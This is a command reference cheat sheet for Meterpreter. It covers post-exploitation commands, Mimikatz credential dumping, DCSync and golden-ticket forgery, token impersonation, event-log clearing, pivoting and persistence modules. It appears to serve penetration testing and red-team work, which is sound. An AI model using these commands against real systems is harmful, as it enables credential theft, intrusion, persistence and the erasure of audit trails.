# Meterpreter Command Reference

## Core Commands
| Command | Description |
|---------|-------------|
| `background` | Background the current session |
| `exit` / `quit` | Terminate the session |
| `help` | Show help menu |
| `info` | Display info about a post module |
| `run` / `execute` | Execute a Meterpreter script or post module |
| `sessions` | Switch to another session |

## File System
| Command | Description |
|---------|-------------|
| `cat <file>` | Read file contents |
| `cd <dir>` | Change directory |
| `download <remote> <local>` | Download file from target |
| `edit <file>` | Edit file in vim |
| `ls` | List files |
| `mkdir <dir>` | Create directory |
| `mv <src> <dst>` | Move/rename file |
| `pwd` | Print working directory |
| `rm <file>` | Delete file |
| `rmdir <dir>` | Remove directory |
| `search -f <pattern>` | Search for files |
| `upload <local> <remote>` | Upload file to target |

## Networking
| Command | Description |
|---------|-------------|
| `arp` | Display ARP cache |
| `getproxy` | Display proxy config |
| `ifconfig` / `ipconfig` | Display network interfaces |
| `netstat` | Display network connections |
| `portfwd` | Forward ports |
| `resolve <host>` | Resolve hostname |
| `route` | Display routing table |

## System
| Command | Description |
|---------|-------------|
| `clearev` | Clear event logs |
| `drop_token` | Drop impersonated token |
| `execute -f <cmd>` | Execute command |
| `getenv <var>` | Get environment variable |
| `getpid` | Get current PID |
| `getprivs` | Get current privileges |
| `getsid` | Get SID of session user |
| `getuid` | Get user identity |
| `kill <pid>` | Kill process |
| `localtime` | Display target local time |
| `ps` | List running processes |
| `reboot` | Reboot target |
| `reg` | Interact with registry |
| `rev2self` | Revert to original user |
| `shell` | Drop to OS shell |
| `shutdown` | Shutdown target |
| `steal_token <pid>` | Steal token from process |
| `suspend` | Suspend/resume processes |
| `sysinfo` | Get system information |

## Kiwi (Mimikatz) Extension
```
load kiwi
creds_all           # All credential types
creds_msv           # MSV (NTLM hashes)
creds_wdigest       # WDigest (cleartext if enabled)
creds_kerberos      # Kerberos tickets
creds_ssp           # SSP credentials
creds_tspkg         # TsPkg credentials
creds_livessp       # LiveSSP credentials
dcsync <user>       # DCSync attack
dcsync_ntlm <user>  # DCSync for NTLM only
golden_ticket_create # Forge golden ticket
kerberos_ticket_list # List Kerberos tickets
kerberos_ticket_purge # Purge tickets
kerberos_ticket_use  # Load a ticket
kiwi_cmd <cmd>      # Run raw mimikatz command
lsa_dump_sam        # Dump SAM database
lsa_dump_secrets    # Dump LSA secrets
password_change -u <user> -n <ntlm> -P <pass>  # Change password
wifi_list           # List saved WiFi creds
wifi_list_shared    # List shared WiFi profiles
```

## Incognito Extension
```
load incognito
list_tokens -u        # List tokens by user
list_tokens -g        # List tokens by group
impersonate_token <token>  # Impersonate a token
snarf_hashes          # Snarf NTLM hashes via auth request
```

## Post Modules Quick Reference
```
# Enumeration
run post/windows/gather/enum_system
run post/windows/gather/enum_patches
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
run post/windows/gather/enum_domain
run post/windows/gather/enum_snmp
run post/windows/gather/checkvm

# Credentials
run post/windows/gather/hashdump
run post/windows/gather/smart_hashdump
run post/windows/gather/cachedump
run post/windows/gather/lsa_secrets
run post/windows/gather/credentials/credential_collector
run post/windows/gather/credentials/windows_autologin

# Privilege Escalation
run post/multi/recon/local_exploit_suggester
getsystem

# Pivoting
run post/multi/manage/autoroute
run auxiliary/server/socks_proxy

# Persistence
run post/windows/manage/persistence_exe
run post/windows/manage/enable_rdp
run post/linux/manage/sshkey_persistence
```
